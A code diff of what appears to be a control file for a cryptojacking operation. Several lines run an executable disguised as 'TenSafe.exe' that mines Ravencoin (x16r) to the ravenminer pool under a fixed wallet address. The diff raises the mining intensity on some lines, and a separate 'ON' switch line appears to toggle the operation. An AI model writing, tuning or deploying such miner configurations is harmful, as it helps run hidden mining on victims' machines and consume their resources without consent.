@@ -6,11 +6,11 @@ Y4X--MMMMMMM.EXE--Y4X
 Y5X--MMMMMMM.EXE--Y5X
 ------------------------------------------------------------------------------------------------------------------------------------
 A1A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.RV13@pplns -i 12 -p x--A1A
-A2A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.RV15@pplns -i 12 -p x--A2A
-A3A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.RV16@pplns -i 12 -p x--A3A
+A2A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.RV15@pplns -i 14 -p x--A2A
+A3A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.RV16@pplns -i 14 -p x--A3A
 A4A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.1013@pplns -i 12 -p x--A4A
-A5A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.1014@pplns -i 12 -p x--A5A
-A6A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.1015@pplns -i 12 -p x--A6A
+A5A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.1014@pplns -i 13 -p x--A5A
+A6A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.1015@pplns -i 14 -p x--A6A
 A7A--\TenSafe.exe -o stratum+tcp://stratum.ravenminer.com:3636 -a x16r -u RFFE8hewXUBViPAukjgDpf2K9sZxRU6Fkj.cf12@pplns -i 12 -p x--A7A
 A9A--ON--A9A
 ------------------------------------------------------------------------------------------------------------------------------------
